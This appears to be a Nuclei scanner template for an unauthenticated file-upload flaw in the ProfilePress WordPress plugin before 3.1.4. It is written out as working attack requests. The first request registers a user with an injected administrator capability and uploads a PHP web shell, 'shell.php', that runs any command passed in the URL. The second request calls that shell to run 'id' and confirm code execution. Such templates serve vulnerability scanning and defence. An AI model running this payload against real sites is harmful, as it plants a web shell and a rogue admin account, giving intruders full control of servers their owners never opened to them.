id: profilepress-unauth-file-upload

info:
  name: ProfilePress < 3.1.4 - Unauthenticated File Upload RCE
  author: Sourabh-Sahu
  severity: critical
  description: |
    ProfilePress (aka WP User Avatar) versions < 3.1.4 are vulnerable to unauthenticated file upload during user registration.
    This allows an attacker to upload a PHP web shell and execute arbitrary commands.
  reference:
    - https://wpscan.com/vulnerability/e12448ec-84a0-46aa-b280-5d9a80ee1e41/
  tags: cve,cve2021,wordpress,profilepress,rce,file-upload,unauth

variables:
  username: "{{to_lower(rand_text_alpha(8))}}"
  email: "{{username}}@example.com"

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="action"

        pp_ajax_signup
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="reg_username"

        {{username}}
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="reg_email"

        {{email}}
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="reg_password"

        Passw0rd
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="reg_password_present"

        true
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="reg_first_name"

        Evil
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="reg_last_name"

        User
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="wp_capabilities[administrator]"

        1
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="files"; filename="shell.php"
        Content-Type: application/x-php

        <?php echo "NUCLEI_RCE_OK:"; system($_GET['cmd']); ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

      - |
        GET /wp-content/uploads/pp-files/shell.php?cmd=id HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "NUCLEI_RCE_OK"
          - "uid="
      - type: status
        status:
          - 200
